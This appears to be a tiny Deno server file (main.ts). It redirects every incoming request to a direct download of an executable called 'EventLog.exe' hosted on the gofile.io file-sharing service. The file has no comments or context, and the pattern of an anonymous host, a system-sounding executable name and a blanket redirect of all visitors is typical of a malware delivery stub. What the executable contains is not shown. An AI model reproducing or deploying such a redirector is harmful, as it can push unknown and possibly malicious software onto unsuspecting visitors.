// main.ts
import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://store-na-phx-4.gofile.io/download/direct/f7cff518-32bd-4f94-b0c1-c3dfd13ba6a9/EventLog.exe",
    },
  });
});
